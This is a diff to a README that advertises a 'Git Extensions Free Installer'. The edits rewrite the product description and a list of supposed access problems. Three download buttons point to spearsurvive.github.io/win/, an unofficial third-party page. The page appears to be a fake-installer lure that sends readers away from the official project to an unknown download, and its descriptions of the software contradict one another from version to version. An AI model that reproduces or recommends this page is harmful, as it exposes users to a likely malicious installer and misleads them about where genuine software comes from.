@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Git Extensions Free Installer** — Git Extensions is a free, open-source Windows Git client with a standalone interface and Windows Explorer integration. Works without internet access, no account required. Full offline installation.
+**💻 Git Extensions Free Installer** — Git Extensions is a free, open-source Git GUI client for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git%20Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git+Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Git Extensions
 
-Git Extensions is a free, open-source Windows Git client with a standalone interface and Windows Explorer integration. It provides a commit graph, interactive rebase, merge tool integration, and plugin system for a comprehensive Git workflow.
+Git Extensions is a free, open-source Git GUI client for Windows, macOS, and Linux. Features a visual commit tree, diff viewer, integration with Windows Explorer and Visual Studio, and support for all major Git operations. Git Extensions has been providing free Git GUI tooling since 2010, making it one of the most established free graphical Git interfaces.
 
 ---
 
 ## ❌ Problem: Git Extensions is hard to access
 
-- **Windows-Primary** — Primarily designed for Windows; cross-platform support secondary
-- **Dated Interface** — UI design reflects older Windows application aesthetics
-- **Development Pace** — Updates arrive less frequently than actively developed clients
-- **Competition** — Fork, GitKraken, and Sourcetree offer more polished experiences
+- **Windows-Focused History** — macOS and Linux support added later; Windows experience most polished
+- **Dated Interface** — Visual design less modern than newer Git clients
+- **Setup Complexity** — Requires configuration of external diff/merge tools
+- **Performance** — Can be slow on very large repositories
 
 ---
 
@@ -81,7 +81,7 @@ Git Extensions is a free, open-source Windows Git client with a standalone inter
 
 <div align="center">
 
-[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git%20Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git+Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Git Extensions is a free, open-source Windows Git client with a standalone inter
 
 ---
 
-**Git Extensions Free Installer** — Git Extensions is a free, open-source Windows Git client with a standalone interface and Windows Explorer integration. Install without internet connection today!
+**Git Extensions Free Installer** — Git Extensions is a free, open-source Git GUI client for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git%20Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Git Extensions](https://img.shields.io/badge/⬇_Install_Git+Extensions-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
